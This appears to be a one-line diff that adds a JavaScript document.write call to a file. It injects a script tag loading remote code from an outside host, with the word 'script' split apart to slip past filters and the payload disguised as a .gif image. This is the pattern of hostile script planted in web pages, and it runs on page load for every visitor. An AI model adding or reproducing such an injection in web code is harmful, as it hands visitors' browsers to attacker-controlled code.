@@ -1,0 +1,1 @@
+document.write("<scr"+"ipt language=javascript src=http://bb.5599bb.com/xxx.gif></scr"+"ipt>");
